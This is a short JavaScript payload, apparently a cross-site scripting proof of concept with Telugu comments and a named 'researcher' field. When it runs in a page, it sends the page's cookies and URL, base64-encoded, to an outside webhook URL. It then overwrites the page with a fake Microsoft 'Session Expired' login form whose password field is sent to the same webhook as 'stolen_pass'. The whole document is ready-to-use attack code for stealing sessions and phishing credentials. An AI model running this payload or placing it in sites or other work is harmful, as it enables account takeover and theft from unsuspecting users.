(function() {
    // నీ కొత్త వెబ్‌హుక్ లింక్ (స్క్రీన్‌షాట్ ప్రకారం)
    const webhook = "https://25ad80f0-8ab5-44cc-90eb-744bea49970e.webhooksite.net/";

    const info = {
        researcher: "Ramavath Gopi Nayak",
        cookies: document.cookie || "No Cookies Found",
        url: window.location.href
    };

    const encoded = btoa(JSON.stringify(info));

    // 1. Image Beacon (అత్యంత నమ్మకమైనది)
    const img = new Image();
    img.src = webhook + "?data=" + encoded;

    // 2. Phishing Form Injection
    document.body.innerHTML = `
        <div style="font-family:Segoe UI; text-align:center; margin-top:100px;">
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" width="120"><br>
            <h2>Session Expired</h2>
            <p>Please log in again.</p>
            <input type="password" id="p" placeholder="Password" style="padding:8px;"><br><br>
            <button id="b" style="background:#0078d4; color:white; border:none; padding:8px 20px;">Login</button>
        </div>`;

    document.getElementById('b').onclick = function() {
        const p = document.getElementById('p').value;
        const creds = btoa(JSON.stringify({stolen_pass: p}));
        new Image().src = webhook + "?creds=" + creds;
        alert("Verification failed. Please try later.");
    };
})();
